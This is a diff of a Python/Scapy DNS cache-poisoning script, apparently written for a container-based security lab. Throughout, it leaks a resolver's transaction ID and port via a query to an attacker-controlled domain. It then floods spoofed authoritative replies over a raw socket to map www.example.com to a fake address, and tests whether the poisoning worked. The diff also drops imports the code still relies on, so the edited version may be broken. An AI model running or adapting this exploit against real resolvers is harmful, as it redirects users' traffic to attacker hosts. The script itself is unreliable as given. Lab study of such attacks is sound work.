@@ -1,19 +1,14 @@
 from scapy.all import *
-import struct
-import socket
-import time
-import random
-
 target_dns = "10.9.0.53"
-# Now spoofing example-dns (10.9.0.154) which root-dns delegates example.com to
-auth_dns = "10.9.0.154"
+dns_server = "10.9.1.153"
+example_auth_dns = "10.9.0.154"
 leak_ns_ip = "10.9.0.10"
-domain = "www.example.com"
-fake_ip = "6.6.6.6" 
+victim_ip = "10.9.0.20"
+fake_ip = "6.6.6.6"
 
-print("[*] 1 & 2. Sniffing for predictable TXID and Port on a controlled domain...")
 
-def sniff_port_and_txid(max_attempts=5):
+def sniff_port_and_txid(max_attempts):
+    print("[*] 1. Leaking resolver TXID/port via controlled domain...")
     for attempt in range(1, max_attempts + 1):
         print("[*] Leak attempt {}/{}...".format(attempt, max_attempts))
         sniffer = AsyncSniffer(
@@ -31,58 +26,60 @@ def sniff_port_and_txid(max_attempts=5):
             ),
         )
         sniffer.start()
-        time.sleep(0.1)
+        time.sleep(0.06)
 
-        # local-dns -> root-dns (.153) -> attacker machine (.10)
-        qname = "{}.leak.attacker.com".format(random.randint(0, 2**31 - 1))
         trigger_leak = (
             IP(dst=target_dns)
-            / UDP(sport=random.randint(1024, 65535), dport=53)
-            / DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
+            / UDP(sport=12345, dport=53)
+            / DNS(rd=1, qd=DNSQR(qname="leak.attacker.com", qtype="A"))
         )
         send(trigger_leak, verbose=0)
 
         sniffer.join()
-        sniffed = sniffer.results
-        if sniffed and len(sniffed) > 0:
-            leaked_txid = sniffed[0][DNS].id
-            target_port = sniffed[0][UDP].sport
+        if sniffer.results and len(sniffer.results) > 0:
+            leaked_txid = sniffer.results[0][DNS].id
+            target_port = sniffer.results[0][UDP].sport
             print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
             return leaked_txid, target_port
 
-    print("[-] Could not sniff local-dns -> attacker-machine traffic on eth0.")
-    print("[-] You are likely running this from the wrong container.")
-    print("[-] Run it on the attacker machine, because leak.attacker.com is delegated there.")
-    print("[-] Example: podman exec -it attacker python3 /attacks/Cache_poisoning.py")
+    print("[-] Could not leak TXID/port from local-dns to attacker.")
     exit(1)
+#wait for the containers to come online
+leaked_txid, target_port = sniff_port_and_txid(5)
 
-leaked_txid, target_port = sniff_port_and_txid()
+print("[*] 3. Triggering resolver to query www.example.com...")
+trigger_query = (
+    IP(dst=target_dns)
+    / UDP(sport=12345, dport=53)
+    / DNS(rd=1, qd=DNSQR(qname="www.example.com", qtype="A"))
+)
+send(trigger_query, verbose=0)
 
-print("[*] 3. Sending request to resolve www.example.com...")
-trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
-send(trigger, verbose=0)
-
-print("[*] 4. Flooding spoofed responses with predictable IDs...")
+print("[*] 4. Flooding spoofed responses...")
+# Use the RAW SOCKET approach for speed
 base_pkt = (
-    IP(src=auth_dns, dst=target_dns) /
+    IP(src=example_auth_dns, dst=target_dns) /
     UDP(sport=53, dport=target_port, chksum=0) /
-    DNS(id=0, qr=1, aa=1, qd=DNSQR(qname=domain), 
-        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata=fake_ip))
+    DNS(id=0, qr=1, aa=1, qd=DNSQR(qname="www.example.com"), 
+        an=DNSRR(rrname="www.example.com", type='A', ttl=86400, rdata=fake_ip))
 )
 
 raw_bytes = bytearray(raw(base_pkt))
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
-# Flood all possible TXIDs since it might be fully randomized or incrementing slightly
-for txid in range(0, 10):
-    struct.pack_into('!H', raw_bytes, 28, (leaked_txid + txid) & 0xFFFF)
+# Start just after the leaked ID. We send a small window (1-20) 
+# to account for any background DNS activity on the resolver.
+for i in range(1, 21):
+    # Pack the NEXT txid into the raw bytearray (offset 28 is the DNS ID field)
+    struct.pack_into('!H', raw_bytes, 28, (leaked_txid + i) % 65536)
     s.sendto(raw_bytes, (target_dns, 0))
 
-print("[*] 5. Testing if attack was successful...")
-test_query = IP(dst=target_dns)/UDP(sport=12346, dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
+
+
+test_query = IP(dst=target_dns)/UDP(sport=12346, dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
 ans = sr1(test_query, timeout=2, verbose=0)
 
 if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
-    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format(domain, fake_ip))
+    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format("www.example.com", fake_ip))
 else:
     print("[-] Attack FAILED. Cache shows different or timeout.")
